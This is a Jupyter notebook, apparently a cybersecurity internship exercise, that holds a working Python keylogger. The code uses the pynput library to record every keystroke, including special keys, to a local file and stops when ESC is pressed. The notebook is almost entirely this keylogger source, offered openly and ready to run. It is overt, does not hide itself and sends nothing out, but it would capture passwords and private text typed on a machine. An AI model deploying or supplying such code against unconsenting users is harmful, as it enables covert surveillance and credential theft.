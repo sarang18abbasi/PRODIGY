{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "358a562d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger started. Press ESC to stop.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "log_file = \"key_log.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        # Special keys (space, enter, etc.)\n",
    "        with open(log_file, \"a\") as f:\n",
    "            if key == keyboard.Key.space:\n",
    "                f.write(\" \")\n",
    "            elif key == keyboard.Key.enter:\n",
    "                f.write(\"\\n\")\n",
    "            else:\n",
    "                f.write(f\" [{key}] \")\n",
    "\n",
    "def on_release(key):\n",
    "    # Stop listener when ESC is pressed\n",
    "    if key == keyboard.Key.esc:\n",
    "        print(\"Keylogger stopped.\")\n",
    "        return False\n",
    "\n",
    "# Start listening\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    print(\"Keylogger started. Press ESC to stop.\")\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b2c44be",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1d4249e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
